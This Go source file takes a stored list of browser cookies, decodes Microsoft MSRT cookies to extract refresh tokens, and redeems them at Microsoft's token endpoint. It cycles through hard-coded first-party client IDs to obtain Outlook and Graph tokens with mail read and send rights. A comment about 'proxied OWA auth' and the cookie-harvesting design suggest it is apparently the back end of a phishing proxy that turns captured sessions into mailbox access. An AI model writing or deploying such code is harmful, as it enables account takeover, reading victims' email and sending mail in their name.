package service

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"go.uber.org/zap"
)

// Known Microsoft public client IDs (no client_secret required)
var msPublicClientIDs = []string{
	"9199bf20-a13f-4107-85dc-02114787ef48", // Outlook Web App (OWA) - primary for proxied OWA auth
	"4765445b-32c6-49b0-83e6-1d93765276ca", // Office.com
	"d3590ed6-52b3-4102-aeff-aad2292ab01c", // Microsoft Office
	"1fec8e78-bce4-4aaf-ab1b-5451cc387264", // Microsoft Teams
	"ab9b8c07-8f02-4f72-87fa-80105867a763", // OneDrive SyncEngine
	"27922004-5251-4030-b22d-91ecd9a37ea4", // Outlook Mobile
}

// msrtData represents the decoded MSRT cookie payload
type msrtData struct {
	RefreshToken          string `json:"refresh_token"`
	RefreshTokenExpiresIn int    `json:"refresh_token_expires_in"`
	ClientInfo            string `json:"client_info"`
	Authority             string `json:"authority"`
	KMSI                  string `json:"kmsi"`
}

// tokenResponse represents the Microsoft OAuth2 token response
type tokenResponse struct {
	AccessToken  string `json:"access_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	RefreshToken string `json:"refresh_token"`
	Error        string `json:"error"`
	ErrorDesc    string `json:"error_description"`
}

// extractRefreshToken attempts to extract a usable refresh token from the stored cookies.
// It checks for MSRT cookies first (which contain a base64-encoded JSON with a refresh_token),
// then falls back to ESTSAuthPersistent cookies.
func extractRefreshToken(cookiesJSON string, logger *zap.SugaredLogger) (refreshToken string, tenantID string) {
	var rawCookies []map[string]interface{}
	if err := json.Unmarshal([]byte(cookiesJSON), &rawCookies); err != nil {
		logger.Debugw("token exchange: failed to parse cookies JSON", "error", err)
		return "", ""
	}

	// Look for MSRT cookie first (contains refresh_token inside base64 JSON)
	for _, c := range rawCookies {
		name, _ := c["name"].(string)
		value, _ := c["value"].(string)
		if name == "" || value == "" {
			continue
		}

		if name == "MSRT" {
			rt, tid := decodeMSRT(value, logger)
			if rt != "" {
				logger.Debugw("token exchange: found MSRT refresh token", "tenant", tid)
				return rt, tid
			}
		}
	}

	// Look for ESTSAuthPersistent cookie (AAD org accounts)
	for _, c := range rawCookies {
		name, _ := c["name"].(string)
		value, _ := c["value"].(string)
		if name == "" || value == "" {
			continue
		}

		if name == "ESTSAUTHPERSISTENT" && len(value) > 50 {
			logger.Debugw("token exchange: found ESTSAUTHPERSISTENT cookie")
			// ESTSAUTHPERSISTENT is a persistent session cookie for AAD
			// It's not directly a refresh token but indicates an active session
		}
	}

	// Look for WLSSC cookie (Windows Live session token - MSA consumer accounts)
	for _, c := range rawCookies {
		name, _ := c["name"].(string)
		value, _ := c["value"].(string)
		if name == "" || value == "" {
			continue
		}

		if name == "WLSSC" && len(value) > 50 {
			logger.Debugw("token exchange: found WLSSC token (Windows Live session)")
			// WLSSC is not a standard refresh token
		}
	}

	return "", ""
}

// decodeMSRT decodes the base64-encoded MSRT cookie value and extracts the refresh_token
func decodeMSRT(value string, logger *zap.SugaredLogger) (refreshToken string, tenantID string) {
	// Add base64 padding if needed
	padding := 4 - len(value)%4
	if padding != 4 {
		value += strings.Repeat("=", padding)
	}

	decoded, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		// Try URL-safe base64
		decoded, err = base64.URLEncoding.DecodeString(value)
		if err != nil {
			logger.Debugw("token exchange: failed to base64 decode MSRT", "error", err)
			return "", ""
		}
	}

	var data msrtData
	if err := json.Unmarshal(decoded, &data); err != nil {
		logger.Debugw("token exchange: failed to parse MSRT JSON", "error", err)
		return "", ""
	}

	if data.RefreshToken == "" {
		logger.Debugw("token exchange: MSRT has no refresh_token")
		return "", ""
	}

	// Extract tenant ID from authority URL
	// e.g., "https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/v2.0"
	tid := ""
	if data.Authority != "" {
		parts := strings.Split(data.Authority, "/")
		for i, p := range parts {
			if p == "login.microsoftonline.com" && i+1 < len(parts) {
				tid = parts[i+1]
				break
			}
		}
	}

	return data.RefreshToken, tid
}

// exchangeRefreshTokenForAccess exchanges a refresh token for an access token
// using the Microsoft OAuth2 token endpoint. It tries multiple public client IDs
// since we don't know which app originally issued the token.
func exchangeRefreshTokenForAccess(refreshToken string, tenantID string, scope string, logger *zap.SugaredLogger) (*tokenResponse, error) {
	// Determine the token endpoint
	// For the Microsoft consumer tenant (9188040d-...), use /consumers/
	// For other tenants, use the specific tenant ID
	tenant := "consumers"
	if tenantID != "" && tenantID != "9188040d-6c67-4c5b-b112-36a304b66dad" {
		tenant = tenantID
	}

	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenant)

	if scope == "" {
		scope = "https://graph.microsoft.com/.default offline_access"
	}

	client := &http.Client{Timeout: 30 * time.Second}

	// Try each public client ID until one works
	for _, clientID := range msPublicClientIDs {
		logger.Debugw("token exchange: trying client_id", "clientID", clientID, "tenant", tenant)

		formData := url.Values{
			"client_id":     {clientID},
			"grant_type":    {"refresh_token"},
			"refresh_token": {refreshToken},
			"scope":         {scope},
		}

		req, err := http.NewRequest("POST", tokenURL, strings.NewReader(formData.Encode()))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", outlookUserAgent)

		resp, err := client.Do(req)
		if err != nil {
			logger.Debugw("token exchange: request failed", "clientID", clientID, "error", err)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var tokenResp tokenResponse
		if err := json.Unmarshal(body, &tokenResp); err != nil {
			logger.Debugw("token exchange: failed to parse response", "clientID", clientID, "error", err)
			continue
		}

		if tokenResp.AccessToken != "" {
			logger.Infow("token exchange: successfully obtained access token",
				"clientID", clientID,
				"scope", tokenResp.Scope,
				"expiresIn", tokenResp.ExpiresIn,
			)
			return &tokenResp, nil
		}

		logger.Debugw("token exchange: client_id failed",
			"clientID", clientID,
			"error", tokenResp.Error,
			"desc", tokenResp.ErrorDesc,
		)
	}

	return nil, fmt.Errorf("token exchange failed with all client IDs")
}

// exchangeForOutlookToken exchanges a refresh token specifically for Outlook API access
func exchangeForOutlookToken(refreshToken string, tenantID string, logger *zap.SugaredLogger) (*tokenResponse, error) {
	return exchangeRefreshTokenForAccess(
		refreshToken,
		tenantID,
		"https://outlook.office.com/Mail.ReadWrite https://outlook.office.com/Mail.Send offline_access",
		logger,
	)
}

// exchangeForGraphToken exchanges a refresh token for Microsoft Graph API access
func exchangeForGraphToken(refreshToken string, tenantID string, logger *zap.SugaredLogger) (*tokenResponse, error) {
	return exchangeRefreshTokenForAccess(
		refreshToken,
		tenantID,
		"https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access",
		logger,
	)
}
